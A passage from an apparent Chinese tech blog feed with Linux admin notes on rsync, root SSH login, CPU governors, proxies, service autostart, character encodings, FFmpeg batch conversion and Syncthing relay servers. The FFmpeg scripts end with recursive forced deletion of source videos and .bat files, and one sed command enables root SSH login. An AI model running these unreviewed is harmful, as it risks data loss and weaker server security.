class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>复制大文件（断点续传）</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">rsync -av --append-verify --progress /path/to/largefile user<span class="hljs-variable">@host</span><span class="hljs-symbol">:/dest/path/</span><br></code></pre></td></tr></table></figure><ul><li><code>-a</code>：递归复制，包括子目录和文件。</li><li><code>-v</code>：显示复制过程。</li><li><code>--append-verify</code>：断点续传，并在结束后校验文件完整性。</li><li><code>--progress</code>：显示复制进度。</li></ul><h1 id="解除root用户登录ssh限制"><a href="#解除root用户登录ssh限制" class="headerlink" title="解除root用户登录ssh限制"></a>解除root用户登录ssh限制</h1><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">sed <span class="hljs-operator">-</span>i &#x27;s<span class="hljs-regexp">/^#\?\s*PermitRootLogin\s\+.*/</span><span class="hljs-type">PermitRootLogin</span> yes<span class="hljs-regexp">/&#x27; /</span>etc<span class="hljs-regexp">/ssh/</span>sshd_config <span class="hljs-operator">||</span> sed <span class="hljs-operator">-</span>i <span class="hljs-operator">-</span><span class="hljs-type">E</span> &#x27;s<span class="hljs-regexp">/^\s*#?\s*PermitRootLogin\s+.*/</span><span class="hljs-type">PermitRootLogin</span> yes<span class="hljs-regexp">/&#x27; /</span>etc<span class="hljs-regexp">/ssh/</span>sshd_config<br></code></pre></td></tr></table></figure><h1 id="cpu性能模式配置"><a href="#cpu性能模式配置" class="headerlink" title="cpu性能模式配置"></a>cpu性能模式配置</h1><p>安装<code>cpufrequtils</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">apt install cpufrequtils<br></code></pre></td></tr></table></figure><p>查看当前cpu的运行频率</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">cpufreq-info<br><br>cpufreq-info | grep &quot;current CPU frequency&quot;<br></code></pre></td></tr></table></figure><p>切换到性能模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">cpufreq-set -r -g performance<br></code></pre></td></tr></table></figure><h4 id="cpu性能模式介绍"><a href="#cpu性能模式介绍" class="headerlink" title="cpu性能模式介绍"></a>cpu性能模式介绍</h4><ol><li><p><strong>performance</strong> ：性能模式会将 CPU 频率保持在最高可用频率，以提供最佳的性能。这是在需要最大处理能力时选择的模式。可以触发睿频。</p></li><li><p><strong>powersave</strong> ：节能模式会将 CPU 频率降低到最低，以节省电力。这在系统需要长时间运行而且对性能要求不高时是一个不错的选择。</p></li><li><p><strong>ondemand</strong> ：按需模式会根据系统负载动态调整 CPU 频率。当负载较低时，CPU 频率会降低以节省电力，而在负载增加时会提高频率以提供更好的响应性能。但是不会触发睿频。</p></li><li><p><strong>conservative</strong> ：保守模式类似于按需模式，但是频率调整更加平滑。它会尽量避免频繁地变更频率，以减少对性能的影响。</p></li></ol><p>列出当前策略模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">cpufreq-info | grep &quot;governor&quot;<br></code></pre></td></tr></table></figure><h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><h2 id="临时代理（仅当前shell下生效）"><a href="#临时代理（仅当前shell下生效）" class="headerlink" title="临时代理（仅当前shell下生效）"></a>临时代理（仅当前shell下生效）</h2><p>开启代理</p><p>http协议</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=http://10.0.0.100:10808<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=http://10.0.0.100:10808<br></code></pre></td></tr></table></figure><p>socks协议</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=socks5://10.0.0.100:10808<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=socks5://10.0.0.100:10808<br></code></pre></td></tr></table></figure><p>取消代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">unset</span> http_proxy<br><span class="hljs-built_in">unset</span> https_proxy<br></code></pre></td></tr></table></figure><h2 id="配置永久代理"><a href="#配置永久代理" class="headerlink" title="配置永久代理"></a>配置永久代理</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vi</span> /etc/<span class="hljs-keyword">profile</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=http://ip:port<br><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=http://ip:port<br><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=socks5://ip:port<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> /etc/profile<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>系统</category>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux配置开机自启动</title>
    <link href="/2024/05/14/%E7%B3%BB%E7%BB%9F/linux/linux%E9%85%8D%E7%BD%AE%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8/"/>
    <url>/2024/05/14/%E7%B3%BB%E7%BB%9F/linux/linux%E9%85%8D%E7%BD%AE%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="rc-local配置自启动"><a href="#rc-local配置自启动" class="headerlink" title="rc.local配置自启动"></a>rc.local配置自启动</h1><p>打开 <code>rc-local.service</code> 脚本内容，内容如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/lib/</span>systemd<span class="hljs-regexp">/system/</span>rc-local.service<br></code></pre></td></tr></table></figure><p><img src="/2024/05/14/%E7%B3%BB%E7%BB%9F/linux/linux%E9%85%8D%E7%BD%AE%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8/image.png" alt="alt text"></p><p>一般正常的启动文件主要分成三部分</p><ul><li><p>[Unit] 段: 启动顺序与依赖关系</p></li><li><p>[Service] 段: 启动行为,如何启动，启动类型</p></li><li><p>[Install] 段: 定义如何安装这个配置文件，即怎样做到开机启动</p></li></ul><p>可以看出，<code>/etc/rc.local</code> 的启动顺序是在网络后面，一般默认是没有 <code>Install</code> 段，也就没有定义如何做到开机启动，所以显然这样配置是无效的。 因此我们就需要在后面帮他加上 <code>[Install]</code> 段:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br><span class="hljs-attr">Alias</span>=rc-local.service<br></code></pre></td></tr></table></figure><blockquote><p>PS：添加了<code>[Install]</code>内容后，下面两行的<code>WantedBy</code>和<code>Alias</code>两个英文跟上面的都是绿色的，要是绿色才有用。</p></blockquote><p>一般需要先修改<code>rc-local.service</code>的权限才可以进行编辑。我是直接root没有这个限制</p><p>系统中新建<code>/etc/rc.local</code>这个文件，默认是没有的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> /etc/rc.local<br></code></pre></td></tr></table></figure><p>给<code>rc.local</code>加上权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chmod</span> +x /etc/rc.local<br></code></pre></td></tr></table></figure><p>做完这一步，还需要最后一步 前面我们说 <code>systemd</code> 默认读取 <code>/etc/systemd/system</code> 下的配置文件, 所以还需要在 <code>/etc/systemd/system</code> 目录下创建软链接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -s <span class="hljs-regexp">/lib/</span>systemd<span class="hljs-regexp">/system/</span>rc-local.service <span class="hljs-regexp">/etc/</span>systemd<span class="hljs-regexp">/system/</span><br></code></pre></td></tr></table></figure><p>最后，打开<code>rc.local</code>，在第一行添加<code>#!/bin/sh</code>，最后一行添加<code>exit 0</code>。然后要执行的命令就写在中间。</p><blockquote><p>如果在 <code>/etc/rc.local</code> 中添加的是 <code>./test.sh</code> 这种脚本类型的，要在末尾加上<code>&amp;</code>， 不然重启的时候会卡在启动界面进不去系统</p></blockquote><h1 id="将程序注册为服务并配置自启动"><a href="#将程序注册为服务并配置自启动" class="headerlink" title="将程序注册为服务并配置自启动"></a>将程序注册为服务并配置自启动</h1><p>新建配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>systemd<span class="hljs-regexp">/system/my</span>script.service<br></code></pre></td></tr></table></figure><p>键入以下配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-comment"># 服务名称（建议用英文，不要包含特殊字符）</span><br><span class="hljs-attr">Description</span>=myscript.service<br><br><span class="hljs-comment"># 确保网络就绪后启动（可添加其他依赖如 mysql.target）</span><br><span class="hljs-attr">After</span>=network.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-comment"># 服务进程类型（simple/forking/oneshot等，simple为默认值）</span><br><span class="hljs-attr">Type</span>=simple<br><br><span class="hljs-comment"># 启动脚本的绝对路径（必须可执行）</span><br><span class="hljs-attr">ExecStart</span>=/path/to/your/script<br><br><span class="hljs-comment"># 工作目录（可选，影响相对路径解析）</span><br><span class="hljs-attr">WorkingDirectory</span>=/path/to/working_dir<br><br><span class="hljs-comment"># 运行用户（建议避免使用root，改用专用用户）</span><br><span class="hljs-attr">User</span>=root<br><br><span class="hljs-comment"># 重启策略：on-failure（非正常退出时重启）或always（任何退出都重启）</span><br><span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-failure<br><br><span class="hljs-comment"># 重启前等待时间（避免频繁重启）</span><br><span class="hljs-attr">RestartSec</span>=<span class="hljs-number">5</span><br><br><span class="hljs-comment"># 在指定时间窗口内限制重启次数（单位：秒）</span><br><span class="hljs-attr">StartLimitIntervalSec</span>=<span class="hljs-number">300</span><br><br><span class="hljs-comment"># 最大重启次数，超过后永久停止</span><br><span class="hljs-attr">StartLimitBurst</span>=<span class="hljs-number">10</span><br><br><span class="hljs-section">[Install]</span><br><span class="hljs-comment"># 服务所属目标（multi-user.target为命令行模式）</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><p>赋予权限</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo chmod <span class="hljs-number">644</span> <span class="hljs-regexp">/etc/</span>systemd<span class="hljs-regexp">/system/my</span>script.service<br></code></pre></td></tr></table></figure><p>重新加载配置文件</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo systemctl daemon-reload</span><br></code></pre></td></tr></table></figure><p>配置开机自启动</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo systemctl <span class="hljs-built_in">enable</span> myscript.service<br></code></pre></td></tr></table></figure><h1 id="在-etc-init-d目录下添加自启动脚本"><a href="#在-etc-init-d目录下添加自启动脚本" class="headerlink" title="在&#x2F;etc&#x2F;init.d目录下添加自启动脚本"></a>在&#x2F;etc&#x2F;init.d目录下添加自启动脚本</h1><p>直接写一个sh脚本，丢到<code>/etc/init.d</code>目录下</p><p>添加软链接</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">sudo ln <span class="hljs-operator">-</span>s <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-regexp">/script /</span>etc<span class="hljs-regexp">/rc2.d/</span><span class="hljs-type">S99script</span><br></code></pre></td></tr></table></figure><blockquote><p>&#x2F;etc&#x2F;rc.d&#x2F;rc0.d&#x2F;～&#x2F;etc&#x2F;rc.d&#x2F;rc6.d&#x2F;文件夹的含义不同，S开头代表是开启时处理的脚本，按照后面紧跟的数字进行按顺序启动，S99则是最后进行启动。</p></blockquote><p><code>rc#.d</code>的不同目录代表的运行级定义如下:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>：系统停机状态，系统默认运行级别不能设为<span class="hljs-number">0</span>，否则不能正常启动<br><span class="hljs-attribute">1</span>：单用户工作状态，root权限，用于系统维护，禁止远程登陆<br><span class="hljs-attribute">2</span>：多用户状态(没有NFS)<br><span class="hljs-attribute">3</span>：完全的多用户状态(有NFS)，登陆后进入控制台命令行模式<br><span class="hljs-attribute">4</span>：系统未使用，保留<br><span class="hljs-attribute">5</span>：X11控制台，登陆后进入图形GUI模式<br><span class="hljs-attribute">6</span>：系统正常关闭并重启，默认运行级别不能设为<span class="hljs-number">6</span>，否则不能正常启动<br></code></pre></td></tr></table></figure><p>在这些目录之下，包含了许多对进程进行控制的脚本。这些脚本要么以 <code>K##</code> 开头，要么以 <code>S##</code> 开头：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">K：<span class="hljs-built_in">kill</span>，系统将终止对应的服务<br>S：<span class="hljs-built_in">start</span>，系统将启动对应的服务<br><span class="hljs-comment">##：同一运行级别下脚本执行的顺序，数值小的先执行，数值大的后执行。很多时候这些执行顺序是很重要的，比如要启动Apache服务，就必须先配置网络接口。</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>系统</category>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>字符集与编码格式研究</title>
    <link href="/2024/05/14/%E7%BC%96%E7%A8%8B/%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F%E7%A0%94%E7%A9%B6/"/>
    <url>/2024/05/14/%E7%BC%96%E7%A8%8B/%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>首先，为什么需要编码？？因为计算机本身可不认识：‘你在做什么？’、‘what are you doing?’等这么人类性的语言；在计算机内部，所有的信息都表示为一个二进制的字符串。而每一个二进制位（bit）有0和1两种状态，具体哪些二进制数表示什么字符，多少位表示什么字符，需要有一个标准，也就是编码。</li><li>比特（bit）：是计算机科学中的基本单位，代表着二进制数字的最小单元，一个比特通常用0和1来表示。</li><li>字节（Byte）：一个字节通常由8位二进制组成，是计量存储容量的单位，是构成信息的一个很小的单位，上面还有KB、MB、GB、TB、PB、EB、ZB、YB等。</li><li>字符：各种文字、符号的总称。例如文字、标点、图形、数字、字母等等。</li><li>字符集：顾名思义，就是一定数量的字符组成的集合，字符集种类比较多，而且每个字符集包含的字符个数也不同，常见字符集主要有：ASCII字符集、GB2312字符集、BIG5字符集、 GB18030字符集、Unicode字符集等，字符集为每一个【字符】分配一个唯一的 ID（学名为码位 &#x2F; 码点 &#x2F; Code Point）。</li><li>字符编码：将字符集中的每个字符映射为字节流的实现方案（编码方案），即属于将【码位】转换为字节序列的规则，便于计算机存储和传输；常见的字符编码有ASCII编码、UTF-8编码、GBK编码、Base64编码等。某种意义上来说，字符集与字符编码有种对应关系，例如 ASCII字符集对应有ASCII编码。</li><li>编码与解码：编码的过程是将字符转换成字节流，解码的过程是将字节流解析为字符。</li></ul><h1 id="常见的字符集和编码格式"><a href="#常见的字符集和编码格式" class="headerlink" title="常见的字符集和编码格式"></a>常见的字符集和编码格式</h1><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs excel">ASCII（American Standard <span class="hljs-built_in">Code</span> for Information Interchange）<br><span class="hljs-built_in">Unicode</span><br>ISO <span class="hljs-number">8859</span><br><span class="hljs-symbol">GB2312</span>、GBK、<span class="hljs-symbol">GB18030</span>（中国国家标准）<br>big5 (繁体中文)<br></code></pre></td></tr></table></figure><h2 id="编码格式"><a href="#编码格式" class="headerlink" title="编码格式"></a>编码格式</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>（Unicode Transformation Format – <span class="hljs-number">8</span>-bit）<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>（Unicode Transformation Format – <span class="hljs-number">16</span>-bit）<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>（Unicode Transformation Format – <span class="hljs-number">32</span>-bit）<br><span class="hljs-attribute">ASCII</span>（在 ASCII 字符集下的编码，与 ASCII 字符集同名）<br><span class="hljs-attribute">ISO</span> <span class="hljs-number">8859</span>（在 ISO <span class="hljs-number">8859</span> 字符集下的编码，与 ISO <span class="hljs-number">8859</span> 字符集同名）<br><span class="hljs-attribute">GB2312</span>、GBK、GB18030（在 GB 字符集下的编码，与相应的字符集同名）<br></code></pre></td></tr></table></figure><h1 id="关系阐述"><a href="#关系阐述" class="headerlink" title="关系阐述"></a>关系阐述</h1><ul><li>ASCII 是最早的字符集之一，包含128个字符，用于表示基本的拉丁字母、数字、标点符号和控制字符。ASCII 字符集的编码格式也被称为 ASCII 编码。</li><li>Unicode 是一种字符集，旨在包含世界上所有的字符，它支持数百种语言的字符。UTF-8、UTF-16 和 UTF-32 是 Unicode 字符集的不同编码格式，用于将 Unicode 字符映射到计算机存储和传输的二进制数据。</li><li>ISO 8859 是一系列字符集，每个字符集用于支持不同的语言和地区。ISO 8859 字符集的编码格式与字符集同名，例如 ISO 8859-1、ISO 8859-2 等。</li><li>GB2312、GBK、GB18030 是中国制定的字符集标准，用于支持中文字符。GB 字符集的编码格式与字符集同名，例如 GB2312 编码、GBK 编码等。</li><li>总之，字符集定义了一组字符的集合，而编码格式则定义了如何将这些字符映射到计算机存储和传输所使用的二进制数据。编码格式是字符集的实际实现方式，通过编码格式，字符集中的字符可以被准确地表示、存储和传输。</li></ul><h1 id="兼容性问题"><a href="#兼容性问题" class="headerlink" title="兼容性问题"></a>兼容性问题</h1><p>各个字符集之间是互不兼容的，如果两个字符需要跨字符集转换，需要找到两个字符都能互相兼容的字符集进行转换。同一个汉字字符集里的码值是完全不一样的。如＂汉＂的Unicode值与gbk就是不一样的，假设Unicode十六进制为a040，GBK十六进制为b030。以UTF-8为例，UTF-8码完全只针对Unicode来组织的，如果GBK要转UTF-8必须先转Unicode码，再转UTF-8</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>视频格式转换</title>
    <link href="/2024/05/14/%E5%85%B6%E5%AE%83/%E8%A7%86%E9%A2%91%E6%A0%BC%E5%BC%8F%E8%BD%AC%E6%8D%A2/"/>
    <url>/2024/05/14/%E5%85%B6%E5%AE%83/%E8%A7%86%E9%A2%91%E6%A0%BC%E5%BC%8F%E8%BD%AC%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<p>这里是用到FFmpeg工具进行转换，方便简单</p><h1 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h1><blockquote><p>FFmpeg 是一个开放源代码的自由软件，可以执行音频和视频多种格式的录影、转换、串流功能[6]，包含了libavcodec——这是一个用于多个项目中音频和视频的解码器函式库，以及libavformat——一个音频与视频格式转换函式库。</p></blockquote><p>项目地址：<a href="https://github.com/BtbN/FFmpeg-Builds">https://github.com/BtbN/FFmpeg-Builds</a></p><h1 id="BAT脚本"><a href="#BAT脚本" class="headerlink" title="BAT脚本"></a>BAT脚本</h1><h2 id="avi转mp4"><a href="#avi转mp4" class="headerlink" title=".avi转mp4"></a>.avi转mp4</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">for</span> %%a <span class="hljs-keyword">in</span> (*.avi) <span class="hljs-keyword">do</span> ffmpeg -i <span class="hljs-string">&quot;%%~a&quot;</span> -codec copy -f mp4 <span class="hljs-string">&quot;%%~na.mp4&quot;</span><br>del <span class="hljs-regexp">/a /</span>f <span class="hljs-regexp">/s /</span>q <span class="hljs-string">&quot;ffmpeg.exe&quot;</span><br>del <span class="hljs-regexp">/a /</span>f <span class="hljs-regexp">/s /</span>q <span class="hljs-string">&quot;*.avi&quot;</span><br>del <span class="hljs-regexp">/a /</span>f <span class="hljs-regexp">/s /</span>q <span class="hljs-string">&quot;*.bat&quot;</span><br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><h2 id="ts转mp4"><a href="#ts转mp4" class="headerlink" title=".ts转mp4"></a>.ts转mp4</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">for</span> %%a <span class="hljs-keyword">in</span> (*.ts) <span class="hljs-keyword">do</span> ffmpeg -i <span class="hljs-string">&quot;%%~a&quot;</span> -codec copy -f mp4 <span class="hljs-string">&quot;%%~na.mp4&quot;</span><br>del <span class="hljs-regexp">/a /</span>f <span class="hljs-regexp">/s /</span>q <span class="hljs-string">&quot;ffmpeg.exe&quot;</span><br>del <span class="hljs-regexp">/a /</span>f <span class="hljs-regexp">/s /</span>q <span class="hljs-string">&quot;*.ts&quot;</span><br>del <span class="hljs-regexp">/a /</span>f <span class="hljs-regexp">/s /</span>q <span class="hljs-string">&quot;*.bat&quot;</span><br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><blockquote><p>ps：如果cmd窗口出现中文乱码，就转成ANSI编码就行，因为cmd窗口无法识别utf-8。</p></blockquote><p>同理也可以写成其他格式，直接批量替换后缀关键字（.ts或.avi）就行，只要FFmpeg支持，基本上，FFmpeg支持几乎所有主流视频格式的转换。</p><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>打开下载的ffmpeg项目压缩包，找到ffmpeg.exe文件，单独拿出来，把bat脚本和ffmpeg.exe放在一个文件夹里，然后把这几个全部复制到需要转换视频的同级目录下，直接双击bat脚本即可。</p>]]></content>
    
    
    <categories>
      
      <category>其它</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脚本</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建syncthing的中继服务器和全球发现服务器</title>
    <link href="/2024/05/14/WEB/%E6%90%AD%E5%BB%BAsyncthing%E7%9A%84%E4%B8%AD%E7%BB%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%85%A8%E7%90%83%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2024/05/14/WEB/%E6%90%AD%E5%BB%BAsyncthing%E7%9A%84%E4%B8%AD%E7%BB%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%85%A8%E7%90%83%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="搭建发现服务器"><a href="#搭建发现服务器" class="headerlink" title="搭建发现服务器"></a>搭建发现服务器</h1><ol><li><p>下载：<a href="https://github.com/syncthing/discosrv/releases">https://github.com/syncthing/discosrv/releases</a></p></li><li><p>将压缩包上传到服务器解压</p></li><li><p>进入文件夹内，后台运行</p></li></ol><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">nohup ./stdiscosrv &gt; /var/<span class="hljs-built_in">log</span>/stdiscosrv.<span class="hljs-built_in">log</span> <span class="hljs-number">2</span>&gt;<span class="hljs-meta">&amp;1 &amp;</span><br></code></pre></td></tr></table></figure><p>默认<code>8443</code>端口，若需要更改端口，添加参数<code>--listen=&quot;:8443&quot;</code></p><h2 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> udp <span class="hljs-attr">--dport</span> <span class="hljs-number">8443</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">8443</span> -j ACCEPT<br></code></pre></td></tr></table></figure><blockquote><p>备注：若要关闭防火墙，把ACCEPT改为DROP</p></blockquote><p>为了确保发现服务器能够正常工作，建议开放TCP和UDP两个协议的端口。</p><h1 id="搭建中继服务器"><a href="#搭建中继服务器" class="headerlink" title="搭建中继服务器"></a>搭建中继服务器</h1><ol><li><p>下载：<a href="https://github.com/syncthing/relaysrv/releases">https://github.com/syncthing/relaysrv/releases</a></p></li><li><p>上传到服务器解压</p></li><li><p>进入文件夹内，后台运行</p></li></ol><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">nohup ./strelaysrv --pools=<span class="hljs-string">&quot;&quot;</span> &gt; /var/<span class="hljs-built_in">log</span>/strelaysrv.<span class="hljs-built_in">log</span> <span class="hljs-number">2</span>&gt;<span class="hljs-meta">&amp;1 &amp;</span><br></code></pre></td></tr></table></figure><p>可选择参数:<code>--pools=&quot;&quot;</code> 表示将中继服务器设为私有。也可以选择不加这个参数，就会将您的中继服务器共享出去作为公共服务器做贡献，让其他使用syncthing的人也可以通过您的服务器中转流量进行文件同步</p><h2 id="防火墙配置-1"><a href="#防火墙配置-1" class="headerlink" title="防火墙配置"></a>防火墙配置</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">22067</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">22070</span> -j 